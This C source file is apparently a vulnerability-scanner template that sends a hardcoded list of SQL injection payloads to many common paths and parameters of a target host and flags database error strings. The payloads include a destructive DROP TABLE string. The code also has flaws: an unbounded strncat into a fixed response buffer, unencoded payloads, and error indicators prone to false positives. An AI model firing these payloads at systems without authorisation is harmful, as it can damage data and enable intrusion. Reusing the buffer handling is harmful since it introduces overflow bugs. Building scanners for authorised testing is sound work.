/*
 * @id: sql-injection-detection-c
 * @name: SQL Injection Detection
 * @author: CERT-X-GEN Security Team
 * @severity: critical
 * @description: Detects SQL injection vulnerabilities through error-based and blind injection techniques
 * @tags: sql-injection, injection, database, sqli, cwe-89, web
 * @cwe: CWE-89
 * @cvss: 9.8
 * @references: https://cwe.mitre.org/data/definitions/89.html, https://owasp.org/www-community/attacks/SQL_Injection
 * @confidence: 90
 * @version: 1.0.0
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>
#include <json-c/json.h>

// Template configuration
typedef struct {
    char id[256];
    char name[256];
    char author[256];
    char severity[32];
    int confidence;
    char tags[512];
    char cwe[32];
} TemplateConfig;

// Finding structure
typedef struct {
    char template_id[256];
    char severity[32];
    int confidence;
    char title[512];
    char description[1024];
    char evidence[2048];
    char cwe[32];
    float cvss_score;
    char remediation[1024];
    char references[1024];
} Finding;

// Global variables
static TemplateConfig config;
static char target_host[256] = {0};
static int target_port = 80;
static int json_output = 0;

// SQL injection payloads
static const char* sql_payloads[] = {
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' AND 1=1--",
    "' AND 1=2--",
    "1' OR '1'='1",
    "1' OR 1=1--",
    "admin'--",
    "admin'/*",
    "' OR 'x'='x",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "') OR (1=1--",
    "' OR 1=1 LIMIT 1--",
    "' OR 1=1 ORDER BY 1--",
    NULL
};

// Common SQL injection parameters
static const char* sql_params[] = {
    "id", "user", "username", "login", "email", "password", "pass", "pwd",
    "search", "query", "q", "filter", "sort", "order", "limit", "offset",
    "category", "cat", "type", "status", "active", "enabled", "visible",
    "page", "p", "page_id", "post_id", "article_id", "product_id",
    "name", "title", "description", "content", "text", "message",
    NULL
};

// HTTP response callback
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t realsize = size * nmemb;
    char* response = (char*)userp;
    strncat(response, (char*)contents, realsize);
    return realsize;
}

// Check for SQL injection indicators
int check_sql_injection_response(const char* response) {
    if (!response) return 0;
    
    // Convert to lowercase for case-insensitive search
    char* lower_response = strdup(response);
    for (int i = 0; lower_response[i]; i++) {
        lower_response[i] = tolower(lower_response[i]);
    }
    
    // SQL error indicators
    const char* error_indicators[] = {
        "sql syntax", "mysql", "postgresql", "oracle", "sqlite", "mssql",
        "sql error", "database error", "query failed", "syntax error",
        "invalid query", "table doesn't exist", "column doesn't exist",
        "duplicate entry", "access denied", "permission denied",
        "connection failed", "timeout", "deadlock", "constraint",
        "foreign key", "primary key", "unique constraint",
        "data too long", "data truncated", "invalid data",
        "conversion failed", "arithmetic overflow", "divide by zero",
        NULL
    };
    
    for (int i = 0; error_indicators[i]; i++) {
        if (strstr(lower_response, error_indicators[i])) {
            free(lower_response);
            return 1;
        }
    }
    
    free(lower_response);
    return 0;
}

// Test SQL injection on a parameter
int test_sql_injection_param(const char* host, int port, const char* path, 
                           const char* param, const char* payload) {
    CURL* curl;
    CURLcode res;
    char url[1024];
    char response[8192] = {0};
    char post_data[1024];
    
    // Build URL
    snprintf(url, sizeof(url), "http://%s:%d%s", host, port, path);
    
    // Build POST data
    snprintf(post_data, sizeof(post_data), "%s=%s", param, payload);
    
    curl = curl_easy_init();
    if (!curl) {
        return 0;
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "CERT-X-GEN/1.0");
    
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    if (res == CURLE_OK) {
        return check_sql_injection_response(response);
    }
    
    return 0;
}

// Test GET parameter SQL injection
int test_get_sql_injection(const char* host, int port, const char* path, 
                          const char* param, const char* payload) {
    CURL* curl;
    CURLcode res;
    char url[1024];
    char response[8192] = {0};
    
    // Build URL with parameter
    snprintf(url, sizeof(url), "http://%s:%d%s?%s=%s", host, port, path, param, payload);
    
    curl = curl_easy_init();
    if (!curl) {
        return 0;
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "CERT-X-GEN/1.0");
    
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    if (res == CURLE_OK) {
        return check_sql_injection_response(response);
    }
    
    return 0;
}

// Create a finding
void create_finding(Finding* finding, const char* title, const char* description, 
                   const char* evidence, const char* severity) {
    strncpy(finding->template_id, config.id, sizeof(finding->template_id) - 1);
    strncpy(finding->severity, severity ? severity : config.severity, sizeof(finding->severity) - 1);
    finding->confidence = config.confidence;
    strncpy(finding->title, title, sizeof(finding->title) - 1);
    strncpy(finding->description, description, sizeof(finding->description) - 1);
    strncpy(finding->evidence, evidence, sizeof(finding->evidence) - 1);
    strncpy(finding->cwe, config.cwe, sizeof(finding->cwe) - 1);
    
    // Calculate CVSS score
    if (strcmp(finding->severity, "critical") == 0) {
        finding->cvss_score = 9.0;
    } else if (strcmp(finding->severity, "high") == 0) {
        finding->cvss_score = 7.5;
    } else if (strcmp(finding->severity, "medium") == 0) {
        finding->cvss_score = 5.0;
    } else if (strcmp(finding->severity, "low") == 0) {
        finding->cvss_score = 3.0;
    } else {
        finding->cvss_score = 0.0;
    }
    
    strncpy(finding->remediation, "Use parameterized queries or prepared statements to prevent SQL injection", 
            sizeof(finding->remediation) - 1);
    strncpy(finding->references, "https://cwe.mitre.org/data/definitions/89.html,https://owasp.org/www-community/attacks/SQL_Injection", 
            sizeof(finding->references) - 1);
}

// Output finding as JSON
void output_finding_json(const Finding* finding) {
    printf("  {\n");
    printf("    \"template_id\": \"%s\",\n", finding->template_id);
    printf("    \"severity\": \"%s\",\n", finding->severity);
    printf("    \"confidence\": %d,\n", finding->confidence);
    printf("    \"title\": \"%s\",\n", finding->title);
    printf("    \"description\": \"%s\",\n", finding->description);
    printf("    \"evidence\": %s,\n", finding->evidence);
    printf("    \"cwe\": \"%s\",\n", finding->cwe);
    printf("    \"cvss_score\": %.1f,\n", finding->cvss_score);
    printf("    \"remediation\": \"%s\",\n", finding->remediation);
    printf("    \"references\": [\"%s\"]\n", finding->references);
    printf("  }");
}

// Main scanning logic
int execute_scan() {
    Finding findings[64];
    int finding_count = 0;
    
    // Common paths to test
    const char* test_paths[] = {
        "/", "/login", "/search", "/user", "/admin", "/api", "/api/users",
        "/products", "/articles", "/posts", "/comments", "/profile",
        "/dashboard", "/settings", "/account", "/register", "/forgot-password",
        NULL
    };
    
    for (int i = 0; test_paths[i] && finding_count < 64; i++) {
        const char* path = test_paths[i];
        
        // Test each parameter with each payload
        for (int j = 0; sql_params[j] && finding_count < 64; j++) {
            const char* param = sql_params[j];
            
            for (int k = 0; sql_payloads[k] && finding_count < 64; k++) {
                const char* payload = sql_payloads[k];
                
                // Test GET parameter
                if (test_get_sql_injection(target_host, target_port, path, param, payload)) {
                    char evidence[2048];
                    char title[512];
                    char description[1024];
                    
                    snprintf(evidence, sizeof(evidence), 
                            "{\"endpoint\": \"http://%s:%d%s\", \"parameter\": \"%s\", \"payload\": \"%s\", \"method\": \"GET\"}", 
                            target_host, target_port, path, param, payload);
                    
                    snprintf(title, sizeof(title), "SQL Injection in GET parameter '%s' on %s", 
                            param, path);
                    
                    snprintf(description, sizeof(description), 
                            "SQL injection vulnerability detected in GET parameter '%s' on %s:%d%s", 
                            param, target_host, target_port, path);
                    
                    create_finding(&findings[finding_count], title, description, evidence, "high");
                    finding_count++;
                    break; // Found vulnerability, move to next parameter
                }
                
                // Test POST parameter
                if (test_sql_injection_param(target_host, target_port, path, param, payload)) {
                    char evidence[2048];
                    char title[512];
                    char description[1024];
                    
                    snprintf(evidence, sizeof(evidence), 
                            "{\"endpoint\": \"http://%s:%d%s\", \"parameter\": \"%s\", \"payload\": \"%s\", \"method\": \"POST\"}", 
                            target_host, target_port, path, param, payload);
                    
                    snprintf(title, sizeof(title), "SQL Injection in POST parameter '%s' on %s", 
                            param, path);
                    
                    snprintf(description, sizeof(description), 
                            "SQL injection vulnerability detected in POST parameter '%s' on %s:%d%s", 
                            param, target_host, target_port, path);
                    
                    create_finding(&findings[finding_count], title, description, evidence, "high");
                    finding_count++;
                    break; // Found vulnerability, move to next parameter
                }
            }
        }
    }
    
    // Output findings
    if (json_output) {
        printf("[\n");
        for (int i = 0; i < finding_count; i++) {
            if (i > 0) printf(",\n");
            output_finding_json(&findings[i]);
        }
        printf("\n]\n");
    } else {
        if (finding_count > 0) {
            printf("\n[+] Found %d SQL injection vulnerability(ies):\n\n", finding_count);
            for (int i = 0; i < finding_count; i++) {
                printf("[%s] %s\n", findings[i].severity, findings[i].title);
                printf("    %s\n", findings[i].description);
                printf("\n");
            }
        } else {
            printf("\n[-] No SQL injection vulnerabilities found\n");
        }
    }
    
    return finding_count;
}

// Get environment variable
char* get_env_var(const char* name) {
    return getenv(name);
}

// Parse arguments
int parse_args(int argc, char* argv[]) {
    // Initialize default config
    strncpy(config.id, "sql-injection-detection", sizeof(config.id) - 1);
    strncpy(config.name, "SQL Injection Detection", sizeof(config.name) - 1);
    strncpy(config.author, "CERT-X-GEN Team", sizeof(config.author) - 1);
    strncpy(config.severity, "high", sizeof(config.severity) - 1);
    config.confidence = 85;
    strncpy(config.tags, "sql-injection,database,web", sizeof(config.tags) - 1);
    strncpy(config.cwe, "CWE-89", sizeof(config.cwe) - 1);
    
    // Parse command line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--target") == 0) {
            if (i + 1 < argc) {
                strncpy(target_host, argv[++i], sizeof(target_host) - 1);
            } else {
                fprintf(stderr, "Error: --target requires an argument\n");
                return 0;
            }
        } else if (strcmp(argv[i], "--port") == 0) {
            if (i + 1 < argc) {
                target_port = atoi(argv[++i]);
            } else {
                fprintf(stderr, "Error: --port requires an argument\n");
                return 0;
            }
        } else if (strcmp(argv[i], "--json") == 0) {
            json_output = 1;
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("Usage: %s [OPTIONS] <target>\n\n", argv[0]);
            printf("%s\n", config.name);
            printf("\nOptions:\n");
            printf("  --target <HOST>  Target host or IP address\n");
            printf("  --port <PORT>    Target port (default: 80)\n");
            printf("  --json           Output findings as JSON\n");
            printf("  --help           Show this help message\n");
            exit(0);
        } else if (!target_host[0] && argv[i][0] != '-') {
            strncpy(target_host, argv[i], sizeof(target_host) - 1);
        }
    }
    
    // Check environment variables (for CERT-X-GEN engine integration)
    if (!target_host[0]) {
        char* host = get_env_var("CERT_X_GEN_TARGET_HOST");
        if (host) {
            strncpy(target_host, host, sizeof(target_host) - 1);
        }
    }
    
    char* port_str = get_env_var("CERT_X_GEN_TARGET_PORT");
    if (port_str) {
        target_port = atoi(port_str);
    }
    
    if (get_env_var("CERT_X_GEN_MODE")) {
        json_output = 1;
    }
    
    if (!target_host[0]) {
        fprintf(stderr, "Error: No target specified\n");
        return 0;
    }
    
    return 1;
}

int main(int argc, char* argv[]) {
    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    // Parse arguments
    if (!parse_args(argc, argv)) {
        curl_global_cleanup();
        return 1;
    }
    
    // Print banner (if not JSON output)
    if (!json_output) {
        printf("\n╔════════════════════════════════════════════════════════════╗\n");
        printf("║  %-52s ║\n", config.name);
        printf("║  CERT-X-GEN Security Template                              ║\n");
        printf("╚════════════════════════════════════════════════════════════╝\n\n");
        printf("Target: %s:%d\n", target_host, target_port);
    }
    
    // Execute the scan
    int finding_count = execute_scan();
    
    // Cleanup
    curl_global_cleanup();
    
    return 0;
}
